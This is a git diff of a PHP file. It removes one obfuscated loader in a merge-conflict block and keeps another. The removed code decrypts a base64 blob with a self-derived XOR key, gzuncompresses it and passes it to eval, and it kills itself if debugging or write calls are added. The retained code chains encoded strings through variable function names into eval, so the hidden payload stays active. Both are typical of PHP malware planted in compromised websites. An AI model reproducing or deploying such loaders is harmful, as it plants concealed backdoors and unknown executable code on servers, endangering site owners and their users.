@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$nelpdkq="9c9f9bd496ef92c14fdea817552acd4a";
-$dzapshb="5d050f565a0656520d5207530c040209515e5500075c54040204015706010704";
-$vkhxhjo="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";
-$ydhfsne=file_get_contents(__FILE__);
-$tayotrvmnt=str_replace($vkhxhjo,"",$ydhfsne);
-if(strpos($tayotrvmnt,"ec"."ho")!==false||strpos($tayotrvmnt,"pr"."int")!==false||strpos($tayotrvmnt,"var_"."dump")!==false||strpos($tayotrvmnt,"file_put_"."contents")!==false||strpos($tayotrvmnt,"fw"."rite")!==false){die();}
-$pzlkweqgry=str_replace(array($nelpdkq,$dzapshb),array("SP_0eae6a92","KP_4a4f766f"),$ydhfsne);
-$wzartqcjeu=md5($pzlkweqgry);
-$tsvfnkbf=hex2bin($dzapshb);
-$xprlufausx="";
-$vglulwdop=strlen($wzartqcjeu);
-for($eveqhbwwif=0;$eveqhbwwif<$vglulwdop;$eveqhbwwif++){
-$xprlufausx.=chr(ord($tsvfnkbf[$eveqhbwwif])^ord($wzartqcjeu[$eveqhbwwif]));
-}
-$ibrtppitei=base64_decode($vkhxhjo);
-$ermgtqpp=strlen($ibrtppitei);
-$qdooddz="";
-$udwgpgn=strlen($xprlufausx);
-for($eveqhbwwif=0;$eveqhbwwif<$ermgtqpp;$eveqhbwwif++){
-$qdooddz.=$ibrtppitei[$eveqhbwwif]^$xprlufausx[$eveqhbwwif%$udwgpgn];
-}
-$rfuhgxnw="gzun"."compress";
-eval($rfuhgxnw($qdooddz));
-=======
 // b2b87e4ae0841d5611cb9e5a
 $MOLxotLSd_ycHG="TEf2+l4lHuCj9nE2XJcyrG5GfcehPih1hIv5KXJoAt0=";
 $__mEjmsEQokX="GRs2+y4yUhPw9aR2KWpleT5TspruCvu1uVi5XKWbNg0=";
@@ -52,4 +27,3 @@ $BORkUuWwevvF=$RhDormsjXc($BORkUuWwevvF);
 $BORkUuWwevvF=$XZKDjBvmoXyS($BORkUuWwevvF);
 $BORkUuWwevvF=$DXLi_IVvAwMP($BORkUuWwevvF);
 eval($BORkUuWwevvF);
->>>>>>> Stashed changes
